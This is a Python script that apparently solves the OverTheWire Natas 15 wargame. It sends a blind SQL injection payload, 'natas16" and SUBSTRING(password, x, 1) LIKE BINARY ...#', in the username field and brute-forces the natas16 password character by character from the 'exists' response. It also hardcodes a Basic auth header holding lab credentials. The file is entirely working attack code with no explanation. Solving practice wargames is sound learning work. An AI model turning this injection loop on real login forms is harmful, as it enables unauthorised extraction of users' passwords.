#!/usr/bin/env python3
import requests as req
from requests.auth import HTTPBasicAuth
import re
import sys
from colorama import Fore
inputs = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"
password = ''
headers = {
    "Authorization": "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="

}
x = 1
while True:

    for i in range(len(inputs)):
        try:
            payload = 'natas16\" and SUBSTRING(password, ' + str(
                x) + ', 1) LIKE BINARY \"%' + inputs[i] + '%\"#'
            # print(payload)
            data = {
                "username": payload
            }
            url = "http://natas15.natas.labs.overthewire.org/index.php?debug"
            try:
                res = req.post(url, headers=headers, data=data, timeout=5)
            except req.exceptions.Timeout:
                print(Fore.LIGHTRED_EX +
                      "\n[!] Timeout, Continueing again" + Fore.WHITE)
                continue
            pattern = re.compile(r'exists')
            result = pattern.findall(res.text)
            sys.stdout.write(
                Fore.LIGHTGREEN_EX + "[+] " + inputs[i] + "  ==> " + Fore.GREEN + password + "\r" + Fore.WHITE)
            if(len(result) > 0):
                password = password + inputs[i]
                break
            sys.stdout.flush()
        except KeyboardInterrupt:
            exit(
                Fore.RED + "\n[-] Detected Keyboard interrupt. Terminating...." + Fore.WHITE)
    x = x + 1
